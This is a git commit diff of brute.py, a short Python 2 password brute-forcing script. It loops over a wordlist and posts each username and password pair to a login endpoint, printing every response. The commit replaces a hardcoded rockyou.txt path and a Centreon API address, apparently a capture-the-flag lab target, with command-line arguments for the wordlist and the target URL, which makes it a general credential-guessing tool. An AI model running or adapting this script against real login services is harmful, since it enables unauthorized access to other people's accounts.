3a1f061614b3cb0c173b659e5e3ae6b5622f3b9c
blaudoom <gjordis@gmail.com>
2019-10-15 20:16:02 +0300

    Update brute.py

--- brute.py
+++ brute.py
@@ -3,17 +3,17 @@ import os, sys
 import json
 
 
-if len(sys.argv) <2:
-	print "Too few arguments! Usage: python brute.py <username>"
-
-f = open("/root/Downloads/rockyou.txt")
+if len(sys.argv) <4:
+	print "Too few arguments! Usage: python brute.py <username> <wordlist(one word per line)> URL"
+	exit()
+f = open(sys.argv[2])
 wordlist = f.readlines()
 size = len(wordlist)
 i = 0
 for word in wordlist:
 	data = { 'username' : sys.argv[1],
 		'password' : word.strip()}		
-	resp = requests.post("http://10.10.10.157/centreon/api/index.php?action=authenticate", data = data)
+	resp = requests.post(sys.argv[3], data = data)
 	print word
 	print resp.text	
 	
